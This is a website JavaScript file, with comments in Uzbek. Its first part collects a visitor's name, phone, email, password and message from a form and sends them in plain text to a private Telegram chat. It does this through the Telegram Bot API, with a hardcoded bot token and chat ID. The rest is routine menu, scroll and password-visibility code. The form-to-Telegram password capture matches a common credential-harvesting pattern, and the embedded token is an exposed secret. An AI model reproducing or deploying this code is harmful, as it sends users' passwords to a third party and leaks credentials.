//bot token
var telegram_bot_id = "6828945487:AAF3YhPbsxqTv8sO1iA6QeUFKrFwdNewfi0"; // token'ni o'rniga Siz yaratgan Bot tokenini yozing
//chat id
var chat_id = 1725724140; // 1111'ni o'rniga habar borishi kerak bo'lgan joyni ID'sini yozing (Batafsil videoda)
var u_name, number, email, password, message;
var ready = function () {
  u_name = document.getElementById("name").value;
  number = document.getElementById("number").value;
  email = document.getElementById("email").value;
  password = document.getElementById("password").value;
  message = document.getElementById("message").value;
  message =
    "Ismi: " +
    u_name +
    "\nTelefon-raqami: " +
    number +
    "\nEmaili: " +
    email +
    "\nParoli: " +
    password +
    "\nIzoh: " +
    message;
};
var sendtelegram = function () {
  ready();
  var settings = {
    async: true,
    crossDomain: true,
    url: "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "cache-control": "no-cache",
    },
    data: JSON.stringify({
      chat_id: chat_id,
      text: message,
    }),
  };
  $.ajax(settings).done(function (response) {
    console.log(response);
  });
  document.getElementById("name").value = "";
  document.getElementById("number").value = "";
  document.getElementById("email").value = "";
  document.getElementById("password").value = "";
  document.getElementById("message").value = "";
  return false;
};

window.addEventListener('DOMContentLoaded', function() {
  window.addEventListener('scroll', function() {
    const header = document.querySelector('header');
    header.classList.toggle('sticky', window.scrollY > 0);
  })

  const menuBtn = document.querySelector('.menu-btn')
  const navigation = document.querySelector('.navigation')
  const navigationItems = document.querySelectorAll('.navigation a')

  menuBtn.addEventListener('click', () => {
    menuBtn.classList.toggle('active')
    navigation.classList.toggle('active')
  })

   navigationItems.forEach(navItems => {
    navItems.addEventListener('click', () => {
      menuBtn.classList.remove('active')
      navigation.classList.remove('active')
    })
   })

   const scrollBtn = document.querySelector('scrollToTop-btn')
   window.addEventListener('scroll', () => {
    scrollBtn.classList.toggle('active', window.scrollY > 500);
   })
   scrollBtn.addEventListener('click', () => {
    document.body.scrollTop = 0;
    document.documentElement.scrollTop = 0;
   })
})

let showpassword = document.getElementById("showpassword");
let passsword = document.getElementById("password");

showpassword.onclick = function(){
	if(passsword.type == "password"){
		passsword.type = "text";
    showpassword.src = "eye-solid.svg";
	}else{
		passsword.type = "password";
    showpassword.src = "eye-slash-solid.svg";
	}
}